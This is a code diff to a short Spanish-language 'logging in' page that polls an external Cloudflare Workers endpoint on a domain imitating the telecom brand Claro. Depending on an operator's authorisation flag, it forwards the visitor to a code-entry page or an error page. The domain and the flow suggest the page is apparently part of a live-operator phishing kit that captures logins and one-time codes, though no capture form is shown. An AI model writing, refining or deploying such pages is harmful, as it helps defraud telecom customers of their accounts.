@@ -1,43 +1,28 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Ingresando...</title>
-</head>
-<body>
-  <h2>Ingresando...</h2>
-  <p id="status">Esperando autorización...</p>
+<h2>Ingresando...</h2>
+<p id="status">Esperando autorización...</p>
 
-  <script>
-    const statusEl = document.getElementById("status");
-    const loginId = localStorage.getItem("loginId");
-    const workerUrl = "https://blue-night-7897.claropromoxlaro.workers.dev/status?id=";
+<script>
+const checkInterval = 3000;
+const statusEl = document.getElementById("status");
+const id = localStorage.getItem("login_id"); // Guardar el id después del submit
 
-    async function checkAuth() {
-      try {
-        const res = await fetch(workerUrl + loginId);
-        const data = await res.json();
+async function checkAuth() {
+  try {
+    const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${id}`);
+    const data = await res.json();
 
-        if (!data) {
-          statusEl.textContent = "ID no encontrado en el servidor.";
-          return;
-        }
-
-        if (data.autorizado === true) {
-          window.location.href = "codigo.html";
-        } else if (data.autorizado === false) {
-          window.location.href = "usererror.html";
-        } else {
-          statusEl.textContent = "Esperando autorización...";
-        }
-
-      } catch(err) {
-        statusEl.textContent = "Error al conectar al servidor.";
-        console.error(err);
-      }
+    if(data.autorizado) {
+      window.location.href = "codigo.html";
+    } else if(data.error) {
+      window.location.href = "usererror.html";
+    } else {
+      statusEl.textContent = "Esperando autorización...";
     }
+  } catch(err) {
+    console.error(err);
+    statusEl.textContent = "Error al conectar al servidor.";
+  }
+}
 
-    setInterval(checkAuth, 3000); // Revisar cada 3 segundos
-  </script>
-</body>
-</html>
+setInterval(checkAuth, checkInterval);
+</script>
